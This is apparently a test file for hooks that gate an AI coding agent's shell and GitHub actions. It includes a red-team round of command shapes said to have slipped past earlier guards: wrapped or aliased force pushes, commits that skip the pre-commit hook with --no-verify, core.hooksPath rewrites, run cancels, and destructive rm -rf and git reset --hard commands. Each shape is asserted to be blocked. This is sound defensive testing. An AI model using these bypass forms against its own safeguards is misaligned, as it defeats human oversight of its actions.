        assert.equal(d?.permissionDecision, "deny", `${name} ${JSON.stringify(input)} ${JSON.stringify(env)}`);
        assert.match(d.permissionDecisionReason, /MERGE-COMMIT-ONLY/);
      }
    }
    // Every merge and arm is DENIED, receipt or not, desk or not (WP-L4); a ready flip without a receipt names the gate.
    const mergeDenied = () => {
      for (const [name, input] of [["mcp__github__enable_pr_auto_merge", { pullNumber: 1, mergeMethod: "MERGE", expectedHeadSha: head }],
        ["mcp__github__enable_pr_auto_merge", { pullNumber: 1 }],
        ["mcp__github__merge_pull_request", { pullNumber: 1, merge_method: "merge", expectedHeadSha: head }],
        ["mcp__github__merge_pull_request", { pullNumber: 1, expectedHeadSha: head }]]) {
        for (const env of [{ APEX_MERGE_DESK: "" }, { APEX_MERGE_DESK: "1" }]) {
          const d = decision(run(name, input, env));
          assert.equal(d?.hookEventName, "PreToolUse");
          assert.equal(d?.permissionDecision, "deny", `${name} ${JSON.stringify(input)} ${JSON.stringify(env)}`);
          assert.match(d.permissionDecisionReason, /land\.yml/);
        }
      }
    };
    mergeDenied();
    for (const input of [{ pullNumber: 1, draft: false }, { pullNumber: 1, draft: "false" }]) {
      const d = decision(run("mcp__github__update_pull_request", input));
      assert.equal(d?.permissionDecision, "deny", JSON.stringify(input));
      assert.match(d.permissionDecisionReason, /ready-gate\.mjs --pr 1/);
      assert.doesNotMatch(d.permissionDecisionReason, /ready-full-cap/, "the ready cap was retired 2026-10-16");
    }
    // With fresh receipts the ready flip passes silently (the live head is the gated head); merges stay denied.
    writeGateReceipt(dir, "merge", 1, head);
    writeGateReceipt(dir, "ready", 1, head);
    mergeDenied();
    assert.equal(decision(run("mcp__github__update_pull_request", { pullNumber: 1, draft: false })), null, "gated ready flip passes");
    writeGateReceipt(dir, "ready", 1, head, { at: new Date(Date.now() - 31 * 60000).toISOString() });
    assert.match(decision(run("mcp__github__update_pull_request", { pullNumber: 1, draft: false })).permissionDecisionReason, /31 min old/);
    writeGateReceipt(dir, "ready", 1, head, { ok: false, evidence: "plan-open: 1 of 3 Plan item(s) open" });
    assert.match(decision(run("mcp__github__update_pull_request", { pullNumber: 1, draft: false })).permissionDecisionReason, /refused \(plan-open/);
    for (const input of [{ pullNumber: 1, body: "x" }, { pullNumber: 1, title: "t" }, { pullNumber: 1, draft: true }])
      assert.equal(decision(run("mcp__github__update_pull_request", input)), null, `silent pass: ${JSON.stringify(input)}`);
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
  const malformed = hook("github-mcp-guard.sh", "not json");
  assert.equal(malformed.status, 2, "an unreadable payload is refused");
  assert.equal(malformed.stdout, "");
  assert.match(malformed.stderr, /BLOCKED: github-mcp-guard could not read the hook payload.*refused \(fail closed\)/);
  const settings = JSON.parse(fs.readFileSync(path.join(ROOT, ".claude/settings.json"), "utf8"));
  assert.ok(!settings.permissions.deny.includes("mcp__github__merge_pull_request"), "the hook denies merges with the land.yml reason; a bare settings deny would drop it");
  const g = settings.hooks.PreToolUse.find((x) => x.hooks.some((h) => h.command.includes("github-mcp-guard.sh")));
  const re = new RegExp(g.matcher);
  for (const n of ["mcp__github__enable_pr_auto_merge", "mcp__github__update_pull_request", "mcp__github__merge_pull_request"]) assert.ok(re.test(n), n);
  for (const n of ["mcp__github__update_pull_request_branch", "mcp__github__disable_pr_auto_merge"])
    assert.ok(!re.test(n), `matcher must not catch ${n}`);
});

// ── RED-TEAM ROUND 2 (2026-10-14, docs/notes/AGENT-GUARDS-2026-10-14.md) ─────
// Every shape below walked past a guard in scratch/retest/hooks-redteam.md; the
// must-pass lists are the false-positive half of the same table.
const DEPLOY = "claude/f1-game-project-26h3ng";
const bashCall = (command, extra = {}) => ({ tool_name: "Bash", tool_input: { command }, ...extra });
const decisionOf = (r) => { try { return JSON.parse(r.stdout.trim().split("\n").pop()).hookSpecificOutput.permissionDecision; } catch { return null; } };

// Inspect hook decisions only: none of the wrapped commands execute here.
const AGENT_RUN = path.join(ROOT, "tools/agent-run.mjs");
const wrapped = (command, options = "") => `node '${AGENT_RUN}' ${options} -- ${command}`;

test("agent-run: wrapped pushes and gh merges receive the direct command's policy", () => {
  const repo = scratchRepo("hook-agent-run-");
  const run = (command, env = {}) => hook("bash-guard.sh", bashCall(command, { cwd: repo.dir }), { cwd: repo.dir, env });
  try {
    repo.g("checkout", "-qb", "cursor/agent-run-1234");
    for (const command of ["git push --force origin topic", `git push origin HEAD:${DEPLOY}`,
      "env CI=1 git push -f origin topic", "bash -c 'git push --force origin topic'"]) {
      const direct = run(command), compact = run(wrapped(command, "--progress --output-level compact --timeout-ms=1000"));
      assert.equal(direct.status, 2, command);
      assert.equal(compact.status, direct.status, `${command}: ${compact.stderr}`);
      assert.match(compact.stderr, /BLOCKED/);
    }
    // Both deny: squash by method, a merge-commit merge by the missing merge-gate receipt (2026-10-19), desk or not.
    for (const [command, expected] of [["gh pr merge 123 --squash", "deny"], ["gh pr merge 123 --merge", "deny"]]) {
      const env = { APEX_MERGE_DESK: "" };
      assert.equal(decisionOf(run(command, env)), expected);
      assert.equal(decisionOf(run(wrapped(command, "--output-level=diagnostic"), env)), expected);
      assert.equal(decisionOf(run(wrapped(command), { APEX_MERGE_DESK: "1" })), expected);
    }
    // cd and git -C must resolve against the same repository as direct argv.
    repo.g("checkout", "-qb", DEPLOY);
    assert.equal(run(wrapped(`git -C '${repo.dir}' push origin HEAD`)).status, 2);
    assert.equal(run(`cd '${repo.dir}' && ${wrapped("git push origin HEAD")}`).status, 2);
  } finally { repo.rm(); }
});

test("agent-run: subagent browser checks unwrap argv, while help/read and literal data never execute", () => {
  const run = (command) => hook("bash-guard.sh", bashCall(command, { agent_id: "agent-run-fixture" }));
  for (const command of ["node tools/ci/test-bg.mjs smoke", "npx playwright test", "npm test", "node tools/ci/verify-change.mjs"]) {
    assert.equal(run(command).status, 2, command);
    assert.equal(run(wrapped(command)).status, 2, command);
    assert.equal(run(wrapped(command, '--progress')).status, 2, command);
  }
  for (const command of ["node --test tests/unit/session-status.test.mjs", "node tools/ci/test-bg.mjs --status",
    "printf '%s' ';' 'git push --force origin x' '&&' 'npm test' '>' 'version.json'",
    "printf '%s' \\; 'git push --force origin x'", "printf '%s' '--help'"]) {
    const result = run(wrapped(command));
    assert.equal(result.status, 0, `${command}: ${result.stderr}`);
    assert.equal(decisionOf(result), null);
  }
  for (const command of [`node '${AGENT_RUN}' --help -- git push --force origin x`,
    `node '${AGENT_RUN}' --read 'artifacts/agent-output/npm test' --output-level full`,
    `node '${AGENT_RUN}' --read 'artifacts/agent-output/npm test' --pointer /rows --limit 3`,
    `node '${AGENT_RUN}' --status 'artifacts/agent-output/npm test' --since cursor`,
    `node '${AGENT_RUN}' help -- npm test`]) assert.equal(run(command).status, 0, command);
  // A similarly named or arbitrary Node script is not a trusted wrapper.
  assert.equal(run("node /unrelated/tools/agent-run.mjs -- npm test").status, 0);
  assert.equal(run(`node other.mjs '${AGENT_RUN}' -- npm test`).status, 0);
});

test("agent-run: invalid wrapper forms fail closed and literal argv operators stay arguments", () => {
  const run = (command) => hook("bash-guard.sh", bashCall(command));
  for (const command of [wrapped("git push -f origin x", "--bogus yes"), wrapped("git push -f origin x", "--output-level invalid"),
    wrapped("git push -f origin x", "--timeout-ms 0"), wrapped("git push -f origin x", "--read artifacts/agent-output/a"),
    wrapped("git push -f origin x", "--status artifacts/agent-output/a"), wrapped("git push -f origin x", "--since cursor"),
    wrapped("git push -f origin x", "--pointer /rows"),
    `node --require bad '${AGENT_RUN}' -- git push -f origin x`, `node '${AGENT_RUN}' -- git push '`,
    `node '${AGENT_RUN}' git push -f origin x`]) {
    const result = run(command);
    assert.equal(result.status, 2, `${command}: ${result.stderr}`);
    assert.match(result.stderr, /cannot (inspect|parse) agent-run/);
  }
  const script = "import json,sys; sys.path.insert(0,sys.argv[1]); import shellparse; print(json.dumps([x[1] for x in shellparse.commands(sys.stdin.read(),sys.argv[2],strict=True)]))";
  const command = wrapped("printf '%s' ';' '&&' '2' '>' '|' '\n' 'git push --force origin x'");
  const result = spawnSync("python3", ["-c", script, path.dirname(PARSE), ROOT], { input: command, encoding: "utf8" });
  assert.equal(result.status, 0, result.stderr);
  assert.deepEqual(JSON.parse(result.stdout), [["printf", "%s", ";", "&&", "2", ">", "|", "\n", "git push --force origin x"]]);
});

test("agent-run: raw cancellation/process rules retain direct policy, exceptions and quote defenses", () => {
  const run = (command, env = {}) => hook("bash-guard.sh", bashCall(command), { env });
  for (const command of ["gh run cancel 123", "gh api -X POST repos/o/r/actions/runs/123/cancel",
    "pkill -f chrome", "pkill -9f node", "killall chrome"]) {
    const direct = run(command), compact = run(wrapped(command));
    assert.equal(direct.status, 2, command);
    assert.equal(compact.status, direct.status, `${command}: ${compact.stderr}`);
  }
  const cancel = "gh run cancel 123";
  for (const command of [wrapped(cancel), `APEX_RUN_CANCEL_OK=1 ${wrapped(cancel)}`,
    wrapped(`env APEX_RUN_CANCEL_OK=1 ${cancel}`)]) {
    const env = command === wrapped(cancel) ? { APEX_RUN_CANCEL_OK: "1" } : {};
    assert.equal(run(command, env).status, 0, command);
  }
  for (const command of ["printf '%s' ';' 'pkill -f chrome' '&&' 'gh run cancel 123'",
    "printf '%s' 'killall chrome'"]) {
    const result = run(wrapped(command));
    assert.equal(result.status, 0, `${command}: ${result.stderr}`);
  }
  // Existing cancellation policy conservatively matches URLs even in data;
  // wrapping must preserve that policy rather than silently weaken it.
  const urlData = "printf '%s' 'https://api.github.com/repos/o/r/actions/runs/123/cancel'";
  assert.equal(run(wrapped(urlData)).status, run(urlData).status);
  assert.equal(run(`node '${AGENT_RUN}' --help -- pkill -f chrome`).status, 0);
  assert.equal(run(`node '${AGENT_RUN}' --read 'artifacts/agent-output/gh run cancel 123'`).status, 0);
  assert.equal(run("node tools/agent-run.mjs -- pkill -f chrome").status, 2, "relative trusted path");
  assert.equal(run("./tools/agent-run.mjs -- pkill -f chrome").status, 2, "direct executable trusted path");
  assert.equal(run("./tools/agent-run.mjs -- git push --force origin topic").status, 2);
});

test("round 2 push: refspec DWIM, @, globs, --prune, config, abbreviations, aliases and wrappers all block", () => {
  const repo = scratchRepo("hook-push2-");
  const run = (command) => hook("bash-guard.sh", bashCall(command, { cwd: repo.dir }), { cwd: repo.dir });
  try {
    repo.g("checkout", "-qb", "cursor/topic-1234");
    for (const c of [
      `git push origin HEAD:heads/${DEPLOY}`, `git push origin heads/${DEPLOY}`, "git push origin 'refs/heads/*:refs/heads/*'",
      "git push --prune origin 'refs/heads/*:refs/heads/*'", "git push --prune origin cursor/x",
      "git -c push.default=matching push origin", "git -c push.default=current push", "git -c remote.origin.push=refs/heads/*:refs/heads/* push",
      "git -c remote.origin.mirror=true push origin", "git -c alias.p=push p -f origin x", "git -c 'alias.p=!git push -f' p origin x",
      "git push --force-w origin x", "git push --forc origin x", "git push --mirr origin", "git push --dele origin cursor/old",
      "git push --al origin", "git push --branches origin", "git push --bran origin",
      "setsid git push -f origin x", "flock /tmp/l git push -f origin x", "flock -w 5 /tmp/l -c 'git push -f origin x'",
      "bash -o pipefail -c 'git push -f origin x'", "bash -c -- 'git push -f origin x'", "sh -ec 'git push -f origin x'",
      "bash <<< 'git push -f origin x'", "echo 'git push -f origin x' | bash", "printf 'git push -f origin x\\n' | sh",
      "env -S 'git push -f origin x'", "ionice -c 3 git push -f origin x", "nice -n 5 timeout -s KILL 30 git push -f origin x",
    ]) {
      const r = run(c);
      assert.equal(r.status, 2, `must block: ${c} (${r.stderr})`);
      assert.match(r.stderr, /BLOCKED/, c);
    }
    for (const c of ["git push -u origin cursor/topic-1234", "git push", "git push origin HEAD", "git push origin @",
      "git push origin cursor/x:cursor/x", "git push --follow-tags origin cursor/x", "git push --no-force-with-lease origin cursor/x",
      "git push --set-upstream origin cursor/x", "git push --tags origin", "git commit --dry-run -F - <<'EOF'\nsubject\n\nnever git push -f\nEOF"])
      assert.equal(run(c).status, 0, `must allow: ${c} (${run(c).stderr})`);
    repo.g("checkout", "-qb", DEPLOY);
    for (const c of ["git push origin @", "git push -u origin @"])
      assert.equal(run(c).status, 2, `on the deploy branch, must block: ${c}`);
    // a configured matching push from a bare `git push` widens it too
    repo.g("checkout", "-qb", "cursor/cfg-1");
    repo.g("config", "push.default", "matching");
    assert.equal(run("git push").status, 2, "push.default=matching in git config");
    assert.equal(run("git push origin cursor/cfg-1").status, 0, "an explicit refspec ignores push.default");
  } finally { repo.rm(); }
});

test("round 2 commit detection: wrappers and aliases require the git hook", () => {
  const repo=scratchRepo("hook-commit2-");
  try { assertCommitReachability(repo,["git -c alias.ci=commit ci -m x", "bash <<< 'git commit -m x'", "echo 'git commit -m x' | sh",
    "bash -o pipefail -c 'git commit -m x'", "setsid git commit -m x", "flock /tmp/l git commit -m x", "sh -ec 'git commit -m x'",
    "bash -c -- 'git commit -m x'", "env -S 'git commit -m x'"],
    ["echo 'git commit -m x'", "git commit --dry-run -m x", "echo 'git commit -m x' | cat", "git log -1"]);
  } finally {repo.rm();}
});
// 2026-10-28 commit-hook split, step 1 (Bryce: "Yes, split it"): .githooks/pre-commit is the git commit gate, so the
// two ways around it — `--no-verify`/`-n` and a core.hooksPath write — are refused in every shape the parser reads.
test("2026-10-28: a commit that skips the git pre-commit hook is refused in every shape, and so is every core.hooksPath write form", () => {
  const repo = scratchRepo("hook-noverify-");
  const run = (command) => hook("bash-guard.sh", bashCall(command, { cwd: repo.dir }), { cwd: repo.dir, env: { APEX_GUARD_PROBE: "" } });
  try {
    fs.writeFileSync(path.join(repo.dir, "docs/PHYSICS.md"), "note 4\n");
    repo.g("add", "docs/PHYSICS.md");
    for (const c of ["git commit --no-verify -m x", "git commit -nm x", "git commit -an -m x", "git commit -m x --no-veri",
      "bash -c 'git commit -n -m x'", "git -c alias.ci='commit --no-verify' ci -m x", "if true; then git commit -n -m x; fi",
      "APEX_SKIP_GUARDS=1 git commit --no-verify -m x"]) {
      const r = run(c);
      assert.equal(r.status, 2, `must refuse: ${c}\n${r.stderr}`);
      assert.match(r.stderr, /--no-verify/, c);
    }
    for (const c of ["git config set core.hooksPath x", "git config --file .git/config core.hooksPath x",
      "git config --remove-section core", "git config unset core.hooksPath", "git config --unset core.hooksPath"]) {
      const r = run(c);
      assert.equal(r.status, 2, `must refuse: ${c}\n${r.stderr}`);
      assert.match(r.stderr, /core/, c);
    }
    // a message that says -n, a dry run, the -S/-u attached values and every read form stay open
    for (const c of ["git commit -m -n", "git commit --dry-run -n -m x", "git commit -Sn -m x", "git commit -uno -m x",
      "git config --get core.hooksPath", "git config get core.hooksPath", "git config --list", "git commit -m x"]) {
      const r = run(c);
      assert.equal(r.status, 0, `must pass: ${c}\n${r.stderr}`);
    }
  } finally { repo.rm(); }
});

test("round 2 gh: squash/rebase denied, merges denied outright, ready flips need the live-head receipt, API-by-id calls still ask", () => {
  const dir = fs.mkdtempSync(path.join(ROOT, "artifacts", "hook-gh-gate-"));
  const head = "a".repeat(40);
  let gh = fakeGh(dir, { head });
  const run = (command, env = { APEX_MERGE_DESK: "" }) => hook("bash-guard.sh", bashCall(command), { env: { ...gh, ...env }, cwd: dir });
  const deny = ["gh pr merge 12 --squash", "gh pr merge 12 -s", "gh pr merge 12 --rebase", "gh pr merge 12 -r --auto",
    "bash -c 'gh pr merge 1 --squash'", "gh api -X PUT repos/o/r/pulls/12/merge -f merge_method=squash",
    "gh api graphql -f query='mutation { enablePullRequestAutoMerge(input:{pullRequestId:\"x\", mergeMethod: SQUASH}) { clientMutationId } }'"];
  // The receipt-gated door: without artifacts/<kind>-gate/<n>.json these are DENIED, desk or not.
  const gated = ["gh pr merge 12", "gh pr merge 12 --merge", "gh pr merge 12 --merge --auto", "gh pr merge 12 --squash=false --merge", "gh pr ready 12"];
  // API calls by id or outside a PR carry no PR number for a receipt: they keep the old ask-unless-desk rule.
  const ask = ["gh api -X PUT repos/o/r/pulls/12/merge", "gh api --method=PUT repos/o/r/pulls/12/merge",
    "gh api graphql -f query='mutation { markPullRequestReadyForReview(input:{pullRequestId:\"x\"}) { clientMutationId } }'",
    "gh api -X POST repos/o/r/merges -f base=x -f head=y"];
  const pass = ["gh pr view 12", "gh pr list", "gh pr ready 12 --undo", "gh pr edit 12 --body 'never gh pr merge --squash'",
    "gh api repos/o/r/pulls/12/merge", "gh api repos/o/r/pulls/12", "gh pr create --draft --title t --body-file - <<'EOF'\ngh pr merge 1 --squash\nEOF",
    "git commit --dry-run -m 'gh pr merge 12 --squash'", "echo gh pr merge 12 --squash"];
  try {
    for (const c of deny) {
      for (const env of [{ APEX_MERGE_DESK: "" }, { APEX_MERGE_DESK: "1" }]) {
        const r = run(c, env);
        assert.equal(decisionOf(r), "deny", `${c} ${JSON.stringify(env)}: ${r.stdout}`);
        assert.match(r.stdout, /MERGE-COMMIT-ONLY/);
      }
    }
    for (const c of gated) {
      for (const env of [{ APEX_MERGE_DESK: "" }, { APEX_MERGE_DESK: "1" }]) {
        const r = run(c, env);
        assert.equal(decisionOf(r), "deny", `${c} ${JSON.stringify(env)}: ${r.stdout}`);
        assert.match(r.stdout, /merge/.test(c) ? /land\.yml/ : /ready-gate\.mjs --pr 12/, `the reason names the route: ${c}`);
      }
    }
    for (const c of ask) {
      const r = run(c);
      assert.equal(decisionOf(r), "ask", `${c}: ${r.stdout}`);
      assert.equal(decisionOf(run(c, { APEX_MERGE_DESK: "1" })), "ask", `the desk no longer silences ${c} (2026-10-26)`);
    }
    denies(run("gh pr merge 12").stdout, /No session merges or arms/, "the reason is merge_policy's");
    for (const c of pass) assert.equal(decisionOf(run(c)), null, `silent pass: ${c}`);
    // WP-L4: with receipts `gh pr ready` passes on the gated live head; a merge stays denied, pinned or not (a
    // hand-written merge receipt used to open it).
    writeGateReceipt(dir, "merge", 12, head);
    writeGateReceipt(dir, "ready", 12, head);
    for (const c of gated) {
      const want = /\bmerge\b/.test(c) ? "deny" : null;
      assert.equal(decisionOf(run(c)), want, `gated ${want ? "merge denied" : "pass"}: ${c}`);
    }
    assert.equal(decisionOf(run(`gh pr merge 12 --merge --match-head-commit ${head}`)), "deny", "a pin to the gated head opens nothing");
    assert.equal(decisionOf(run("gh pr merge --merge")), "deny");
    gh = fakeGh(dir, { head: "b".repeat(40) });
    denies(run("gh pr ready 12").stdout, /the PR head bbbbbbbbbbbb is not the gated head/, "the head moved after the gate");
    gh = fakeGh(dir, { head: null });
    denies(run("gh pr ready 12").stdout, /live head is unknown/, "an unreadable live head refuses");
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
});

test("gh api / curl REST ready flip: passes with a fresh ready-gate receipt on the live head, else asks with the gate text", () => {
  const dir = fs.mkdtempSync(path.join(ROOT, "artifacts", "hook-api-ready-"));
  const head = "a".repeat(40);
  let gh = fakeGh(dir, { head });
  const run = (command) => hook("bash-guard.sh", bashCall(command), { env: { ...gh, APEX_MERGE_DESK: "" }, cwd: dir });
  const flips = ["gh api -X POST repos/o/r/pulls/12/ccr/ready_for_review",
    "gh api --method=PATCH repos/o/r/pulls/12 -F draft=false",
    "curl -X POST https://api.github.com/repos/o/r/pulls/12/ccr/ready_for_review"];
  const asksGate = (c, why) => {
    const r = run(c);
    assert.equal(decisionOf(r), "ask", `${why}: ${c}\n${r.stdout}`);
  };
  try {
    for (const c of flips) asksGate(c, "no receipt");
    writeGateReceipt(dir, "ready", 12, head);
    for (const c of flips) assert.equal(decisionOf(run(c)), null, `fresh receipt on the live head passes: ${c}`);
    writeGateReceipt(dir, "ready", 12, head, { at: new Date(Date.now() - 31 * 60000).toISOString() });
    for (const c of flips) asksGate(c, "stale receipt");
    writeGateReceipt(dir, "ready", 12, head);
    gh = fakeGh(dir, { head: "b".repeat(40) });
    for (const c of flips) asksGate(c, "the head moved after the gate");
    gh = fakeGh(dir, { head });
    writeGateReceipt(dir, "ready", 13, head);
    fs.rmSync(path.join(dir, "artifacts/ready-gate/12.json"));
    asksGate(flips[0], "a receipt for another PR does not open #12");
    writeGateReceipt(dir, "ready", 12, head);
    assert.equal(decisionOf(run("gh api graphql -f query='mutation { markPullRequestReadyForReview(input:{pullRequestId:\"x\"}) { clientMutationId } }'")), "ask",
      "GraphQL carries no PR number: it keeps the plain ask");
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
});

test("round 2 subagent ban: decided on the parsed argv, every runner spelling, node-only checks stay open", () => {
  const sub = (command, extra = { agent_id: "a1", agent_type: "general-purpose" }) => hook("bash-guard.sh", bashCall(command, extra));
  const browser = ["node \"tools/ci/test-bg.mjs\" smoke", "npx playwright 'test'", "eval \"npm test\"", "sh -ec 'npm test'",
    "bash -c -- 'npx playwright test'", "npm t", "npm tst", "npm run-script test:smoke", "npm --silent test", "npm exec playwright test",
    "npm exec -- playwright test", "npx --yes playwright test", "npx -y playwright test", "./node_modules/.bin/playwright test",
    "node node_modules/@playwright/test/cli.js test", "cd tools/shot && node shot.mjs monza", "cd tools && node ./ui/layout-audit.mjs",
    "tools/mcp/apex-tools-mcp.sh call apex_shot '{\"track\":\"monza\"}'", "tools/mcp/apex-tools-mcp.sh call apex_hud_mock '{}'",
    "node tools/mcp/apex-tools-mcp.mjs call apex_eval '{}'", "echo 'npm test' | bash", "bash <<< 'npx playwright test'",
    "setsid npm test", "flock /tmp/l npm test", "xargs -I{} npm run test:smoke", "env CI=1 npx playwright test",
    "node tools/ci/verify-change.mjs", "npm run test", "npx -c 'playwright test'"];
  const open = ["npm run test:tooling-fast -- --changed", "node --test tests/unit/docs-integrity.test.mjs", "node tools/shot/shot.mjs --help",
    "node tools/ui/css-play.mjs --plan", "node tools/ci/test-bg.mjs --status", "node tools/ci/test-bg.mjs --tail smoke",
    "node tools/ci/verify-change.mjs --fast", "node tools/shot/frame-report.mjs monza", "echo 'npm test'", "grep -rn 'playwright test' docs",
    "tools/mcp/apex-tools-mcp.sh call apex_status '{}'", "npx playwright install chromium", "cat <<'EOF'\nnpm test\nEOF",
    "node tools/ci/tooling-fast.mjs --changed --jobs=3", "npm run test:guards"];
  for (const c of browser) assert.equal(sub(c).status, 2, `a subagent must not run: ${c}`);
  for (const c of open) assert.equal(sub(c).status, 0, `a subagent may run: ${c} (${sub(c).stderr})`);
  assert.equal(sub("npm t", { agent_type: "verify-agent" }).status, 2, "agent_type alone marks a subagent");
  for (const c of browser.slice(0, 6)) assert.equal(hook("bash-guard.sh", bashCall(c)).status, 0, `the main session may run: ${c}`);
});

test("round 2 mcp-browser-guard: agent_type counts, the apex browser list matches the MCP catalog and the matcher", () => {
  const run = (payload) => hook("mcp-browser-guard.sh", payload);
  assert.equal(run({ tool_name: "mcp__playwright-official__browser_navigate", agent_type: "general-purpose" }).status, 2);
  assert.equal(run({ tool_name: "mcp__apex-tools__apex_hud_mock", agent_id: "a1" }).status, 2);
  assert.equal(run({ tool_name: "mcp__apex-tools__apex_hud_mock" }).status, 0, "the main session keeps its browser");
  // every catalog entry that boots Chromium (kind "browser", or week 2) is guarded in all three places
  const src = fs.readFileSync(path.join(ROOT, "tools/mcp/apex-tools-mcp.mjs"), "utf8");
  const cat = src.slice(src.indexOf("const CATALOG = ["));
  const blocks = cat.split(/\n\s{4}name: "/).slice(1);
  const browserTools = blocks.filter((b) => /^\s*(kind: "browser"|week: 2),?$/m.test(b.split(/\n\s{2}\},?\n/)[0])).map((b) => b.split('"')[0]);
  assert.ok(browserTools.includes("apex_hud_mock") && browserTools.length >= 10, `catalog parse: ${browserTools}`);
  const settings = JSON.parse(fs.readFileSync(path.join(ROOT, ".claude/settings.json"), "utf8"));
  const matcher = new RegExp(settings.hooks.PreToolUse.find((g) => g.hooks.some((h) => h.command.includes("mcp-browser-guard.sh"))).matcher);
  const parse = fs.readFileSync(path.join(ROOT, ".claude/hooks/shellparse.py"), "utf8");
  for (const t of [...browserTools, "apex_job_start"]) {
    assert.ok(matcher.test(`mcp__apex-tools__${t}`), `settings matcher must select ${t}`);
    assert.equal(run({ tool_name: `mcp__apex-tools__${t}`, agent_id: "a1" }).status, 2, `hook must block ${t}`);
    assert.match(parse, new RegExp(`"${t}"`), `shellparse APEX_BROWSER must list ${t} (apex-tools-mcp.sh call)`);
  }
});

test("round 2 protect-files: a symlink resolves before the rules; surveyor removals and whole-tree git verbs block", () => {
  const repo = scratchRepo("hook-pf2-");
  const out = fs.mkdtempSync(path.join(ROOT, "artifacts", "hook-pf2-link-"));
  const run = (payload) => hook("protect-files.sh", { cwd: repo.dir, ...payload }, { cwd: repo.dir });
  try {
    fs.writeFileSync(path.join(repo.dir, "version.json"), "{}\n");
    fs.symlinkSync(path.join(repo.dir, "version.json"), path.join(out, "v.json"));
    const w = run({ tool_name: "Write", tool_input: { file_path: path.join(out, "v.json"), content: "x" } });
    assert.equal(w.status, 2, w.stderr);
    assert.match(w.stderr, /version\.json.*GENERATED/);
    const surv = (command) => run({ tool_name: "Bash", tool_input: { command }, agent_id: "s1", agent_type: "track-surveyor" });
    for (const c of ["mv js/game.js scratch/g.js", "rm -rf js/track", "rm docs/PHYSICS.md", "git stash", "git stash pop",
      "git reset --hard", "git clean -fd", "git switch main", "git checkout -b x", "unlink js/game.js "])
      assert.equal(surv(c).status, 2, `surveyor must not: ${c}`);
    for (const c of ["rm scratch/x.txt", "mv scratch/a js/circuits/monza.js", "git stash list", "git clean -n", "rm -rf artifacts/old",
      "git status", "cp scratch/x js/circuits/scenery/monza.js"])
      assert.equal(surv(c).status, 0, `surveyor may: ${c} (${surv(c).stderr})`);
    // a generated file removed or rewritten by the cheap channels is a hand edit too
    for (const c of ["rm version.json", "awk -i inplace '{print}' version.json"])
      assert.equal(run({ tool_name: "Bash", tool_input: { command: c } }).status, 2, c);
    assert.equal(run({ tool_name: "Bash", tool_input: { command: "rm -rf scratch/x" } }).status, 0);
  } finally { repo.rm(); fs.rmSync(out, { recursive: true, force: true }); }
});

test("round 2 github-mcp-guard: falsy draft spellings need the ready receipt; every arm is denied", () => {
  const dir = fs.mkdtempSync(path.join(ROOT, "artifacts", "hook-round2-"));
  const gh = fakeGh(dir, { head: "f".repeat(40) });
  const run = (tool_name, tool_input, env = { APEX_MERGE_DESK: "" }) => decisionOf(hook("github-mcp-guard.sh", { tool_name, tool_input }, { env: { ...gh, ...env }, cwd: dir }));
  try {
    for (const draft of [false, 0, "0", "no", "NO", "False", "off"])
      assert.equal(run("mcp__github__update_pull_request", { pullNumber: 1, draft }), "deny", `draft ${JSON.stringify(draft)} without a receipt`);
    for (const draft of [true, 1, "true", null]) assert.equal(run("mcp__github__update_pull_request", { pullNumber: 1, draft }), null);
    const desk = { APEX_MERGE_DESK: "1" };
    assert.equal(run("mcp__github__enable_pr_auto_merge", { pullNumber: 1 }, desk), "deny", "an omitted method: denied like every arm");
    assert.equal(run("mcp__github__enable_pr_auto_merge", { pullNumber: 1, mergeMethod: "MERGE" }, desk), "deny", "MERGE named, no receipt");
    writeGateReceipt(dir, "merge", 1, "f".repeat(40));
    writeGateReceipt(dir, "ready", 1, "f".repeat(40));
    assert.equal(run("mcp__github__enable_pr_auto_merge", { pullNumber: 1, mergeMethod: "MERGE", expectedHeadSha: "f".repeat(40) }, desk), "deny", "a hand-written merge receipt opens nothing (WP-L4)");
    for (const draft of [false, "0", "off"]) assert.equal(run("mcp__github__update_pull_request", { pullNumber: 1, draft }), null, `draft ${JSON.stringify(draft)} with a receipt`);
    for (const m of ["Squash-merge", ["squash"], "REBASE "]) assert.equal(run("mcp__github__merge_pull_request", { pullNumber: 1, merge_method: m }), "deny", JSON.stringify(m));
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
});

test("a commit's gh ready denial still wins before hook reachability", () => {
  const repo=scratchRepo("hook-context-");
  try {
    missingHook(repo,"git status");
    const r=hook("bash-guard.sh",bashCall("git commit -m x && gh pr ready 12"),
      {cwd:repo.dir,env:{...fakeGh(repo.dir,{head:"a".repeat(40)}),APEX_MERGE_DESK:""}});
    assert.equal(r.status,0,r.stderr);
    assert.equal(JSON.parse(r.stdout).hookSpecificOutput.permissionDecision,"deny");
  } finally {repo.rm();}
});
// ── THE CLOG OF 2026-10-15 (docs/notes/CI-CLOG-SURVEY-2026-10-15.md) ────────
// 306 of 401 PR runs that day ended cancelled, 142 of them in 17 one-minute
// sweeps under the owner's account, and every sweep was followed by a
// "retrigger" push. A queued run holds no slot, so the sweep bought nothing
// and the retrigger bought a second run. Both doors refuse the cancel; the
// push hold AGENTS.md rule 4 described in prose is enforced.
test("2026-10-15: an Actions run cancel is refused at both doors; a re-run asks", () => {
  const run = (command, env = {}) => hook("bash-guard.sh", bashCall(command), { env });
  for (const c of ["gh run cancel 38683549544", "gh run cancel 1 --repo o/r", "gh api -X POST repos/o/r/actions/runs/123/cancel",
    "curl -X POST -H 'Authorization: Bearer x' https://api.github.com/repos/o/r/actions/runs/123/cancel",
    "curl -X POST \"https://api.github.com/repos/o/r/actions/runs/123/cancel\"", "bash -c 'gh run cancel 5'",
    "gh api -X POST repos/o/r/actions/runs/123/force-cancel", "gh api -X POST \"repos/o/r/actions/runs/$id/cancel\""]) {
    const r = run(c);
    assert.equal(r.status, 2, `must block: ${c} (${r.stderr})`);
    assert.match(r.stderr, /BLOCKED: cancelling an Actions run/);
  }
  for (const c of ["gh run view 1", "gh run list --limit 5", "echo 'gh run cancel 1'", "gh api repos/o/r/actions/runs/123/jobs",
    "node tools/ci/test-bg.mjs --stop", "cat >> t.mjs <<'EOT'\ncurl https://api.github.com/repos/o/r/actions/runs/123/cancel\nEOT"])
    assert.equal(run(c).status, 0, `must allow: ${c}`);
  assert.equal(run("gh run cancel 1", { APEX_RUN_CANCEL_OK: "1" }).status, 0, "the user asked: env override");
  assert.equal(run("APEX_RUN_CANCEL_OK=1 gh run cancel 1").status, 0, "the user asked: command override");
